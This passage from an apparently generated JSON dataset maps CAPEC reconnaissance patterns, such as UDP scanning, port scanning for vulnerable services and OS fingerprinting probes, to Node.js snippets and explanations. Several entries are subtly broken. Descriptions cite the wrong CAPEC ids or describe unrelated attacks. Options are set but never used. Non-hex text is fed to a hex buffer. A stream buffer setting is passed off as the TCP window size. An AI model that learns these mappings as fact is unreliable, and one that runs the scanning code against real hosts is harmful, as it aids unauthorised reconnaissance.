        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst message = Buffer.from('Hello, UDP');\nconst targetPort = 12345;\nconst targetHost = '192.168.1.1';\n\nclient.send(message, 0, message.length, targetPort, targetHost, (err) => {\n  if (err) {\n    console.error('Error sending message:', err);\n  } else {\n    console.log('Message sent');\n  }\n  client.close();\n});\n\nclient.on('message', (msg, rinfo) => {\n  console.log(`Received response from ${rinfo.address}:${rinfo.port} - ${msg}`);\n});\n\nclient.on('error', (err) => {\n  console.error('Socket error:', err);\n  client.close();\n});",
        "description": "This JavaScript code snippet demonstrates a basic UDP scan using Node.js. The code creates a UDP socket and sends a UDP datagram to a specified target host and port. It listens for any response messages from the target, which can help determine the status of the UDP port. This embodies the main idea of the CAPEC 'UDP Scan' by attempting to gather information about the target's UDP port status. The code also touches on related CWEs: it could expose sensitive information (CWE-200) if responses are not properly handled, and it does not include integrity checks (CWE-353) or encryption (CWE-319), making it vulnerable to sniffing and tampering."
    },
    {
        "capec_id": "309",
        "capec_name": "Network Topology Mapping",
        "code_snippet": "const http = require('http');\nconst os = require('os');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/network-info') {\n    const networkInterfaces = os.networkInterfaces();\n    res.writeHead(200, {'Content-Type': 'application/json'});\n    res.end(JSON.stringify(networkInterfaces));\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code creates a simple HTTP server using Node.js. When a request is made to the '/network-info' endpoint, the server responds with detailed network interface information of the host machine. This information includes IP addresses, MAC addresses, and other network-related details. The code embodies the concept of 'Network Topology Mapping' (CAPEC-309) by exposing sensitive network information that can be used by an adversary to map the network. The related CWEs are represented as follows: CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) is demonstrated by exposing network details to any requester, CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) is shown by providing system-level network information without proper authorization checks, and CWE-1125 (Excessive Attack Surface) is illustrated by the server exposing an endpoint that reveals sensitive information."
    },
    {
        "capec_id": "310",
        "capec_name": "Scanning for Vulnerable Software",
        "code_snippet": "const net = require('net');\nconst sensitivePorts = [21, 23, 25, 161]; // FTP, Telnet, SMTP, SNMP\nconst targetIP = '192.168.1.1';\n\nsensitivePorts.forEach(port => {\n  const socket = new net.Socket();\n  socket.setTimeout(2000);\n  socket.on('connect', () => {\n    console.log(`Port ${port} is open on ${targetIP}`);\n    socket.destroy();\n  }).on('timeout', () => {\n    socket.destroy();\n  }).on('error', (err) => {\n    socket.destroy();\n  }).connect(port, targetIP);\n});",
        "description": "This JavaScript code snippet demonstrates a basic port scanning activity to identify open ports on a target IP address, specifically focusing on ports commonly associated with vulnerable services (FTP, Telnet, SMTP, SNMP). The code iterates over a list of sensitive ports and attempts to establish a connection to each port on the target IP. If a connection is successful, it logs that the port is open, indicating a potential vulnerability. This embodies the main idea of CAPEC-300: Scanning for Vulnerable Software, by probing for open ports that may be running outdated or misconfigured services. The code also touches on related CWEs by potentially exposing sensitive system information (CWE-497) and demonstrating an excessive attack surface (CWE-1125)."
    },
    {
        "capec_id": "311",
        "capec_name": "DEPRECATED: OS Fingerprinting",
        "code_snippet": "const http = require('http');\nconst os = require('os');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/os-info') {\n    // Vulnerable to information exposure\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(`OS Type: ${os.type()}\nOS Platform: ${os.platform()}\nOS Release: ${os.release()}`);\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code creates an HTTP server that listens on port 8080. When a request is made to the '/os-info' endpoint, it responds with detailed information about the operating system, such as OS type, platform, and release. This represents a vulnerability related to OS Fingerprinting (CAPEC-312 and CAPEC-313) by exposing sensitive OS information. The code also touches on CWE-532 (Information Exposure Through Debug Log Files) by potentially exposing sensitive information that could be used for further attacks. Additionally, it indirectly relates to CWE-287 (Authentication Bypass Issues) as it does not implement any authentication mechanism to protect the sensitive information being exposed."
    },
    {
        "capec_id": "312",
        "capec_name": "Active OS Fingerprinting",
        "code_snippet": "const net = require('net');\n\nconst probePacket = Buffer.from('4500003c1c4640004006b1e6c0a80001c0a80002', 'hex');\nconst targetIP = '192.168.0.2';\nconst targetPort = 80;\n\nconst client = new net.Socket();\nclient.connect(targetPort, targetIP, () => {\n  client.write(probePacket);\n});\n\nclient.on('data', (data) => {\n  console.log('Received response:', data.toString('hex'));\n  client.destroy();\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});\n\nclient.on('error', (err) => {\n  console.error('Error:', err.message);\n});",
        "description": "This JavaScript code snippet demonstrates a basic example of active OS fingerprinting. It uses the 'net' module to create a TCP client that sends a crafted probe packet to a target IP address and port. The probe packet is designed to elicit a response that can reveal information about the target's operating system based on how it handles the anomalous input. The response is logged in hexadecimal format, which can be analyzed to determine the OS type and version. This code embodies the main idea of CAPEC-312 (Active OS Fingerprinting) by probing a target to detect its OS through unique response behaviors. The related CWEs are represented by the potential exposure of sensitive information (CWE-200, CWE-497), observable discrepancies (CWE-207), and the cleartext transmission of the probe and response (CWE-319)."
    },
    {
        "capec_id": "313",
        "capec_name": "Passive OS Fingerprinting",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // Log incoming data for passive OS fingerprinting\n    console.log(`Received data: ${data.toString()}`);\n    // Simulate analysis of data to identify OS\n    const osSignature = identifyOS(data.toString());\n    console.log(`Identified OS: ${osSignature}`);\n  });\n});\n\nserver.listen(8080, '0.0.0.0', () => {\n  console.log('Server listening on port 8080');\n});\n\nfunction identifyOS(data) {\n  // Dummy function to simulate OS identification\n  if (data.includes('Windows')) return 'Windows';\n  if (data.includes('Linux')) return 'Linux';\n  return 'Unknown OS';\n}",
        "description": "This JavaScript code snippet sets up a simple TCP server using Node.js that listens for incoming data on port 8080. When data is received, it logs the data and simulates the process of identifying the operating system based on the data content. This represents the concept of passive OS fingerprinting by monitoring network communication to infer the OS type. The code also touches on related CWEs by potentially exposing sensitive information (CWE-200, CWE-497) and handling data in cleartext (CWE-319). The 'identifyOS' function is a placeholder to demonstrate how OS signatures might be matched."
    },
    {
        "capec_id": "314",
        "capec_name": "DEPRECATED: IP Fingerprinting Probes",
        "code_snippet": "const http = require('http');\nconst dns = require('dns');\n\nhttp.createServer((req, res) => {\n  const clientIP = req.connection.remoteAddress;\n  dns.reverse(clientIP, (err, hostnames) => {\n    if (err) {\n      res.writeHead(500, {'Content-Type': 'text/plain'});\n      res.end('Server Error');\n      return;\n    }\n    if (hostnames.includes('trusted.domain.com')) {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end('Access Granted');\n    } else {\n      res.writeHead(403, {'Content-Type': 'text/plain'});\n      res.end('Access Denied');\n    }\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that performs a DNS reverse lookup on the client's IP address to make an access control decision. If the client's IP resolves to 'trusted.domain.com', access is granted; otherwise, access is denied. This embodies the deprecated CAPEC-312 (Active OS Fingerprinting) by attempting to identify the client's origin based on IP and DNS information. It also touches on CWE-247 (Reliance on DNS Lookups in a Security Decision), highlighting the vulnerability of making security decisions based on potentially unreliable DNS information."
    },
    {
        "capec_id": "315",
        "capec_name": "DEPRECATED: TCP/IP Fingerprinting Probes",
        "code_snippet": "const net = require('net');\nconst crypto = require('crypto');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // Simulate a capture-replay vulnerability\n    const receivedHash = data.toString();\n    const expectedHash = crypto.createHash('sha256').update('secret').digest('hex');\n\n    if (receivedHash === expectedHash) {\n      socket.write('Authentication successful');\n    } else {\n      socket.write('Authentication failed');\n    }\n  });\n});\n\nserver.listen(1337, '127.0.0.1');\n\n// Client code to simulate replay attack\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n  const hash = crypto.createHash('sha256').update('secret').digest('hex');\n  client.write(hash); // Replay the hash\n});\n\nclient.on('data', (data) => {\n  console.log('Server response: ' + data.toString());\n  client.destroy(); // Close the connection\n});",
        "description": "This JavaScript code snippet demonstrates a TCP server that is vulnerable to a capture-replay attack, which is related to CWE-294 (Authentication Bypass by Capture-replay). The server listens for incoming connections and expects a SHA-256 hash of a secret string for authentication. The client connects to the server and sends the correct hash, simulating a replay attack. The server incorrectly authenticates the client based on the replayed hash, illustrating the vulnerability. This example embodies the main idea of CAPEC-312 (Active OS Fingerprinting) by showing how network traffic can be manipulated to bypass authentication mechanisms."
    },
    {
        "capec_id": "316",
        "capec_name": "DEPRECATED: ICMP Fingerprinting Probes",
        "code_snippet": "const dns = require('dns');\nconst http = require('http');\n\nconst server = http.createServer((req, res) => {\n  const hostname = req.headers['host'];\n  dns.lookup(hostname, (err, address) => {\n    if (err) {\n      res.writeHead(500);\n      res.end('Server Error');\n      return;\n    }\n    if (address === '192.168.1.1') { // Trusted IP\n      res.writeHead(200);\n      res.end('Access Granted');\n    } else {\n      res.writeHead(403);\n      res.end('Access Denied');\n    }\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server running on port 8080');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that makes a security decision based on the result of a DNS lookup. The server checks the hostname from the request headers and performs a DNS lookup to get the corresponding IP address. If the IP address matches a trusted IP ('192.168.1.1'), access is granted; otherwise, access is denied. This code embodies the deprecated CWE-247 (Reliance on DNS Lookups in a Security Decision), which is now covered by CWE-350. The main idea is to highlight the vulnerability of making security decisions based on DNS lookups, as DNS responses can be spoofed, leading to potential security breaches."
    },
    {
        "capec_id": "317",
        "capec_name": "IP ID Sequencing Probe",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nlet ipID = 0;\n\nclient.on('message', (msg, rinfo) => {\n  const ipHeader = msg.slice(0, 20);\n  const id = ipHeader.readUInt16BE(4);\n  console.log(`Received packet from ${rinfo.address} with IP ID: ${id}`);\n  ipID = id;\n});\n\nclient.on('error', (err) => {\n  console.log(`Client error: ${err.stack}`);\n  client.close();\n});\n\nclient.bind(41234, () => {\n  console.log('Client bound to port 41234');\n});\n\n// Send a probe packet to the target\nconst target = '192.168.1.1';\nconst message = Buffer.from('Hello');\nclient.send(message, 0, message.length, 41234, target, (err) => {\n  if (err) {\n    console.log(`Send error: ${err.stack}`);\n    client.close();\n  } else {\n    console.log(`Sent probe to ${target}`);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a simple UDP client that sends a probe packet to a target IP address and listens for incoming packets. Upon receiving a packet, it extracts and logs the IP ID field from the IP header. This process can be used to analyze the IP ID sequence generation algorithm of the target host, which is the main idea of the 'IP ID Sequencing Probe' CAPEC. The code also highlights potential vulnerabilities such as 'Exposure of Sensitive Information to an Unauthorized Actor' (CWE-200) by logging the IP ID, and 'Reliance on IP Address for Authentication' (CWE-291) by using the IP address to identify the target."
    },
    {
        "capec_id": "318",
        "capec_name": "IP 'ID' Echoed Byte-Order Probe",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst message = Buffer.from('Hello');\nconst ipID = 12345; // Arbitrary IP ID value\n\nclient.on('message', (msg, rinfo) => {\n  const echoedIPID = msg.readUInt16BE(4); // Read the echoed IP ID from the ICMP error message\n  if (echoedIPID === ipID) {\n    console.log('IP ID echoed back correctly');\n  } else {\n    console.log('IP ID not echoed back correctly');\n  }\n  client.close();\n});\n\nclient.send(message, 0, message.length, 12345, 'target.host', (err) => {\n  if (err) throw err;\n  console.log('UDP message sent');\n});",
        "description": "This JavaScript code snippet demonstrates a simplified version of the 'IP 'ID' Echoed Byte-Order Probe' attack. It sends a UDP datagram with an arbitrary IP 'ID' value to a closed port on a remote host. The code listens for an ICMP error message and checks if the IP 'ID' value is echoed back correctly. This can help identify the operating system or router firmware based on how the IP 'ID' is handled. The code also touches on CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially revealing sensitive information about the remote host's OS or firmware. The use of an arbitrary IP 'ID' value and the handling of the ICMP error message are key aspects of this probe."
    },
    {
        "capec_id": "319",
        "capec_name": "IP (DF) 'Don't Fragment Bit' Echoing Probe",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst message = Buffer.from('');\nconst options = {\n  address: '192.168.1.1', // Target IP address\n  port: 12345, // Closed port\n  df: true // Set the Don't Fragment (DF) bit\n};\n\nclient.send(message, 0, message.length, options.port, options.address, (err) => {\n  if (err) throw err;\n  console.log('UDP message sent with DF bit set');\n});\n\nclient.on('message', (msg, rinfo) => {\n  const dfBitSet = (msg.readUInt8(6) & 0x40) !== 0; // Check if DF bit is set in the response\n  console.log(`DF bit echoed back: ${dfBitSet}`);\n  client.close();\n});",
        "description": "This JavaScript code snippet demonstrates a UDP client that sends a datagram with the 'Don't Fragment' (DF) bit set to a specified IP address and port. The target port is intentionally closed to trigger an ICMP error message. The client then listens for a response and checks if the DF bit is echoed back in the ICMP error message. This behavior can be used for OS fingerprinting, as different operating systems handle the DF bit differently. The code embodies the main idea of the CAPEC by illustrating how an attacker might probe a remote host to gather information about its operating system. The related CWEs provide context on potential security weaknesses, such as exposure of sensitive information (CWE-200) and incorrectly specified destinations in communication channels (CWE-941)."
    },
    {
        "capec_id": "320",
        "capec_name": "TCP Timestamp Probe",
        "code_snippet": "const net = require('net');\n\nconst options = {\n  host: 'target.server.com',\n  port: 80\n};\n\nconst client = net.createConnection(options, () => {\n  console.log('Connected to server!');\n});\n\nclient.on('data', (data) => {\n  const timestamp = extractTimestamp(data);\n  console.log(`Received TCP timestamp: ${timestamp}`);\n  // Analyze timestamp to infer OS\n  analyzeTimestamp(timestamp);\n  client.end();\n});\n\nclient.on('end', () => {\n  console.log('Disconnected from server');\n});\n\nfunction extractTimestamp(data) {\n  // Simplified extraction of TCP timestamp from data\n  // In a real scenario, this would involve parsing the TCP header\n  const timestampRegex = /timestamp:(\\d+)/;\n  const match = data.toString().match(timestampRegex);\n  return match ? match[1] : null;\n}\n\nfunction analyzeTimestamp(timestamp) {\n  // Placeholder for timestamp analysis logic\n  console.log(`Analyzing timestamp: ${timestamp}`);\n  // Different OSes have different timestamp increments\n  // This function would contain logic to infer the OS based on the timestamp\n}",
        "description": "This JavaScript code snippet demonstrates a basic TCP client that connects to a target server and extracts TCP timestamps from the received data. The main idea is to probe the server for TCP timestamps, which can then be analyzed to infer the operating system of the target. This embodies the CAPEC of 'TCP Timestamp Probe' by showing how an attacker might gather and analyze TCP timestamps. The code also touches on related CWEs, such as the exposure of sensitive information (CWE-200) through the timestamp and the potential for observable timing discrepancies (CWE-208) during the analysis."
    },
    {
        "capec_id": "321",
        "capec_name": "TCP Sequence Number Probe",
        "code_snippet": "const net = require('net');\n\nfunction generatePredictableSequenceNumber(ackNumber) {\n  // CWE-337: Predictable Seed in PRNG\n  const seed = ackNumber; // Using ackNumber as seed\n  return (seed + 1) % 4294967296; // Simple predictable sequence number generation\n}\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    const ackNumber = data.readUInt32BE(0); // Read the ACK number from the probe packet\n    const sequenceNumber = generatePredictableSequenceNumber(ackNumber);\n    console.log(`Generated Sequence Number: ${sequenceNumber}`);\n    // CWE-319: Cleartext Transmission of Sensitive Information\n    socket.write(`ACK: ${ackNumber}, SEQ: ${sequenceNumber}`); // Respond with predictable sequence number\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates a TCP server that listens on port 8080. When it receives data, it reads the acknowledgment number (ACK) from the incoming packet and generates a predictable sequence number based on this ACK number. The sequence number is generated using a simple predictable algorithm (CWE-337: Predictable Seed in PRNG). The server then responds with the ACK and the generated sequence number in cleartext (CWE-319: Cleartext Transmission of Sensitive Information). This demonstrates the CAPEC concept of TCP Sequence Number Probe, where the sequence number generation can be fingerprinted to identify the operating system."
    },
    {
        "capec_id": "322",
        "capec_name": "TCP (ISN) Greatest Common Divisor Probe",
        "code_snippet": "const net = require('net');\n\nfunction sendSynPacket(targetHost, targetPort) {\n  const client = new net.Socket();\n  client.connect(targetPort, targetHost, () => {\n    console.log('Connected to target');\n    client.write('SYN'); // Simulate sending a SYN packet\n  });\n\n  client.on('data', (data) => {\n    console.log('Received:', data.toString());\n    const isn = extractISN(data);\n    console.log('Extracted ISN:', isn);\n    client.destroy();\n  });\n\n  client.on('close', () => {\n    console.log('Connection closed');\n  });\n}\n\nfunction extractISN(data) {\n  // Dummy function to simulate ISN extraction\n  return data.slice(0, 4).toString('hex');\n}\n\nsendSynPacket('192.168.1.1', 80);",
        "description": "This JavaScript code snippet demonstrates a simplified version of the 'TCP (ISN) Greatest Common Divisor Probe' attack. It uses the 'net' module to create a TCP connection to a target host and port, simulating the sending of a SYN packet. Upon receiving a response, it extracts the Initial Sequence Number (ISN) from the SYN/ACK packet. This ISN can be analyzed to infer the operating system of the target machine. The code embodies the CAPEC by illustrating how an attacker might probe a target system to gather sensitive information (ISN) that can be used for OS fingerprinting. The related CWEs are represented by the exposure of sensitive information (ISN) to an unauthorized actor and the potential for this data to be transmitted in cleartext."
    },
    {
        "capec_id": "323",
        "capec_name": "TCP (ISN) Counter Rate Probe",
        "code_snippet": "const crypto = require('crypto');\n\nlet lastISN = crypto.randomInt(0, 2**32);\nlet lastTime = Date.now();\n\nfunction generateISN() {\n  const currentTime = Date.now();\n  const timeDiff = currentTime - lastTime;\n  lastTime = currentTime;\n  lastISN += timeDiff;\n  return lastISN;\n}\n\n// Simulate ISN generation over time\nsetInterval(() => {\n  console.log(`Generated ISN: ${generateISN()}`);\n}, 1000);",
        "description": "This JavaScript code snippet simulates the generation of TCP Initial Sequence Numbers (ISNs) using a time-based algorithm. The `generateISN` function increments the ISN based on the time elapsed since the last ISN was generated. This approach is vulnerable to timing analysis, as an attacker can measure the rate of ISN increments over time to infer the underlying operating system, aligning with the CAPEC description. The code also touches on CWE-385 (Covert Timing Channel) by demonstrating how timing information can be used to infer sensitive information. Additionally, the use of `Date.now()` introduces potential race conditions (CWE-362) if the function were to be called concurrently without proper synchronization."
    },
    {
        "capec_id": "324",
        "capec_name": "TCP (ISN) Sequence Predictability Probe",
        "code_snippet": "const crypto = require('crypto');\n\nfunction generateISN() {\n  // Predictable seed based on current time\n  const seed = Date.now();\n  const random = crypto.createHash('sha256').update(seed.toString()).digest('hex');\n  // Convert hex to integer\n  const isn = parseInt(random.slice(0, 8), 16);\n  return isn;\n}\n\nconsole.log('Generated ISN:', generateISN());",
        "description": "This JavaScript code snippet demonstrates the generation of an Initial Sequence Number (ISN) for a TCP connection using a predictable seed, which is the current time (Date.now()). The code uses the SHA-256 hash function to create a pseudo-random number from the seed. However, because the seed is predictable (based on the current time), the generated ISN can be predicted by an attacker who knows the time at which the ISN was generated. This embodies the main idea of the CAPEC 'TCP (ISN) Sequence Predictability Probe' by showing how an attacker could predict the sequence number generation algorithm. The related CWEs are represented as follows: CWE-337 (Predictable Seed in PRNG) is shown by using the current time as the seed, CWE-341 (Predictable from Observable State) is demonstrated by the predictability of the ISN based on the observable system time, and CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) is implied as the predictable ISN could be used to hijack TCP sessions."
    },
    {
        "capec_id": "325",
        "capec_name": "TCP Congestion Control Flag (ECN) Probe",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nconst ECN_FLAG = 0x02; // Example ECN flag\n\nclient.connect(80, 'example.com', () => {\n  console.log('Connected to server');\n  // Send a packet with ECN flag\n  const packet = Buffer.from([ECN_FLAG]);\n  client.write(packet);\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data.toString('hex'));\n  client.destroy(); // Close the connection\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});\n\nclient.on('error', (err) => {\n  console.error('Error: ' + err.message);\n});",
        "description": "This JavaScript code snippet demonstrates a TCP client that connects to a server and sends a packet with an ECN (Explicit Congestion Notification) flag. The code uses the 'net' module to create a socket connection to 'example.com' on port 80. Upon connection, it sends a packet with an ECN flag to check if the remote host supports ECN messaging. The client listens for any data received from the server and logs it in hexadecimal format before closing the connection. This code embodies the main idea of the CAPEC by probing the remote host for ECN support, which can reveal information about the host's operating system and its handling of ECN flags. The related CWEs are represented by the potential exposure of sensitive information (CWE-200), improper handling of error messages (CWE-1320), and the lack of integrity checks (CWE-353)."
    },
    {
        "capec_id": "326",
        "capec_name": "TCP Initial Window Size Probe",
        "code_snippet": "const net = require('net');\n\nfunction tcpWindowSizeProbe(targetIP, targetPort) {\n  const client = new net.Socket();\n  client.connect(targetPort, targetIP, () => {\n    console.log('Connected to target');\n    const initialWindowSize = client._readableState.highWaterMark;\n    console.log(`Initial TCP Window Size: ${initialWindowSize}`);\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.error('Connection error:', err);\n  });\n}\n\ntcpWindowSizeProbe('192.168.1.1', 80);",
        "description": "This JavaScript code snippet demonstrates a TCP Initial Window Size Probe, which is used for OS fingerprinting by checking the initial TCP window size of a target system. The code establishes a TCP connection to a specified target IP and port, retrieves the initial window size from the socket's readable state, and logs it. This information can be used to infer the operating system of the target, as different OSes use different initial window sizes. The code also handles connection errors gracefully. This snippet embodies the CAPEC concept by illustrating how an attacker might gather sensitive information (initial window size) from a target system, potentially leading to unauthorized access or further exploitation."
    },
    {
        "capec_id": "327",
        "capec_name": "TCP Options Probe",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // Extract TCP options from the incoming packet\n    const tcpOptions = extractTCPOptions(data);\n    console.log('Received TCP options:', tcpOptions);\n\n    // Simulate exposure of sensitive information\n    if (tcpOptions.includes('sensitiveOption')) {\n      console.log('Sensitive information exposed:', tcpOptions);\n    }\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});\n\nfunction extractTCPOptions(data) {\n  // Dummy function to simulate extraction of TCP options\n  // In a real scenario, this would parse the TCP header\n  return ['option1', 'sensitiveOption', 'option3'];\n}",
        "description": "This JavaScript code snippet creates a TCP server using the 'net' module. The server listens for incoming connections on port 8080. When data is received, it extracts TCP options from the incoming packet using a dummy function 'extractTCPOptions'. The extracted options are logged to the console. If the options include a 'sensitiveOption', it simulates the exposure of sensitive information by logging it. This code embodies the main idea of the CAPEC 'TCP Options Probe' by analyzing TCP header options and demonstrates CWE-200 (Exposure of Sensitive Information) by logging sensitive options. It also hints at CWE-188 (Reliance on Data/Memory Layout) by assuming a specific structure for TCP options."
    },
    {
        "capec_id": "328",
        "capec_name": "TCP 'RST' Flag Checksum Probe",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(80, 'example.com', () => {\n  console.log('Connected');\n  // Send a malformed RST packet with ASCII data\n  const rstPacket = Buffer.from('4500003c1c4640004006b1e6c0a80001c0a80002' + 'RST ASCII DATA', 'hex');\n  client.write(rstPacket);\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data.toString());\n  client.destroy(); // kill client after server's response\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet uses the 'net' module to create a TCP client that connects to a server on port 80. Once connected, it sends a malformed RST (reset) packet containing ASCII data. The server's response is logged to the console. This code embodies the main idea of the CAPEC by demonstrating how an attacker might send a specially crafted RST packet to probe for OS fingerprinting. The related CWEs are represented by the potential exposure of sensitive information (CWE-200), lack of integrity checks (CWE-353, CWE-354), and the transmission of data in cleartext (CWE-319). The code highlights the risk of sending and receiving data without proper validation and encryption, which could be exploited by unauthorized actors."
    },
    {
        "capec_id": "329",
        "capec_name": "ICMP Error Message Quoting Probe",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.on('message', (msg, rinfo) => {\n  console.log(`Server got: ${msg} from ${rinfo.address}:${rinfo.port}`);\n  // Simulate an ICMP error message with sensitive information\n  const errorMessage = `ICMP Error: Port Unreachable. Original message: ${msg.toString()}`;\n  console.log(errorMessage); // CWE-209: Generation of Error Message Containing Sensitive Information\n  // Send back the error message\n  server.send(errorMessage, rinfo.port, rinfo.address, (err) => {\n    if (err) console.error('Error sending message:', err);\n  });\n});\n\nserver.on('error', (err) => {\n  console.error(`Server error:\n${err.stack}`);\n  server.close();\n});\n\nserver.bind(41234);",
        "description": "This JavaScript code snippet creates a UDP server using the 'dgram' module. When the server receives a message, it logs the message and the sender's information. It then simulates an ICMP error message (Port Unreachable) that includes the original message content, which is a representation of CWE-209 (Generation of Error Message Containing Sensitive Information). The error message is then sent back to the sender. This demonstrates the CAPEC concept of generating an ICMP error message and quoting the original request, potentially exposing sensitive information."
    },
    {
        "capec_id": "330",
        "capec_name": "ICMP Error Message Echoing Integrity Probe",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.on('message', (msg, rinfo) => {\n  console.log(`Server got: ${msg} from ${rinfo.address}:${rinfo.port}`);\n  // Simulate an ICMP error message with sensitive information\n  const errorMessage = `ICMP Error: Port Unreachable. Original message: ${msg}`;\n  server.send(errorMessage, rinfo.port, rinfo.address, (err) => {\n    if (err) console.error('Error sending message:', err);\n  });\n});\n\nserver.on('error', (err) => {\n  console.error(`Server error:\n${err.stack}`);\n  server.close();\n});\n\nserver.bind(41234);",
        "description": "This JavaScript code snippet creates a UDP server using the 'dgram' module. When the server receives a message, it logs the message and the sender's information. It then simulates an ICMP error message (Port Unreachable) that includes the original message content, which could contain sensitive information. This demonstrates the CAPEC concept of generating an ICMP error message and exposing sensitive information (CWE-200, CWE-211). The code also lacks integrity checks (CWE-353), making it vulnerable to capture-replay attacks (CWE-294)."
    },
    {
        "capec_id": "331",
        "capec_name": "ICMP IP Total Length Field Probe",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst message = Buffer.from('');\nconst targetPort = 12345; // Closed port\nconst targetHost = '192.168.1.1';\n\nclient.send(message, targetPort, targetHost, (err) => {\n  if (err) {\n    console.error('Error sending message:', err);\n    client.close();\n    return;\n  }\n  console.log('Message sent');\n});\n\nclient.on('message', (msg, rinfo) => {\n  console.log(`Received message from ${rinfo.address}:${rinfo.port}`);\n  console.log('IP Header Total Length Field:', msg.readUInt16BE(2));\n  client.close();\n});",
        "description": "This JavaScript code snippet uses the 'dgram' module to create a UDP client that sends an empty UDP packet to a closed port on a target machine. The goal is to trigger an 'ICMP Port Unreachable' error message from the target. When the error message is received, the code extracts and logs the IP Header's total length field value from the response. This behavior aligns with the CAPEC description of probing for IP header information to build a signature of operating system responses. The code also touches on related CWEs by demonstrating how an observable response discrepancy (CWE-204) can be exploited to gather information about the target system."
    },
    {
        "capec_id": "332",
        "capec_name": "ICMP IP 'ID' Field Error Message Probe",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst message = Buffer.from('Hello');\nconst targetPort = 12345;\nconst targetHost = '192.168.1.1';\n\nclient.send(message, 0, message.length, targetPort, targetHost, (err) => {\n  if (err) throw err;\n  console.log('UDP message sent');\n});\n\nclient.on('message', (msg, rinfo) => {\n  console.log(`Received response: ${msg} from ${rinfo.address}:${rinfo.port}`);\n  // Check for ICMP error message and analyze the IP ID field\n  if (msg.includes('ICMP')) {\n    console.log('ICMP error message received');\n    // Extract and analyze the IP ID field from the ICMP message\n    const ipIdField = msg.slice(4, 6).toString('hex');\n    console.log(`IP ID Field: ${ipIdField}`);\n  }\n  client.close();\n});",
        "description": "This JavaScript code snippet demonstrates a UDP client that sends a datagram to a closed port on a target host. The client listens for an ICMP error message in response. When an ICMP error message is received, the code extracts and logs the IP ID field from the message. This process can be used to fingerprint specific OS behaviors based on how the IP ID field is echoed back in the ICMP error message. The code embodies the main idea of CAPEC-ICMP IP 'ID' Field Error Message Probe and highlights CWE-204 (Observable Response Discrepancy) by revealing internal state information through the ICMP error message."
    },
    {
        "capec_id": "383",
        "capec_name": "Harvesting Information via API Event Monitoring",
        "code_snippet": "const http = require('http');\nconst server = http.createServer((req, res) => {\n  if (req.url === '/event' && req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString();\n    });\n    req.on('end', () => {\n      const userData = JSON.parse(body);\n      console.log(`User ID: ${userData.user_id}, Username: ${userData.username}`); // Logging sensitive data\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end('Event received');\n    });\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n});\nserver.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for POST requests to the '/event' endpoint. When a request is received, it collects the data sent in the request body, which includes sensitive information such as user IDs and usernames. This data is then logged to the console in cleartext, representing a potential security vulnerability. The code embodies the main idea of the CAPEC by demonstrating how an adversary could harvest sensitive information via API event monitoring. The related CWEs are represented by the lack of encryption (CWE-311), cleartext transmission of sensitive information (CWE-319), and the exposure of sensitive information through data queries (CWE-202)."
    },
    {
        "capec_id": "384",
        "capec_name": "Application API Message Manipulation via Man-in-the-Middle",
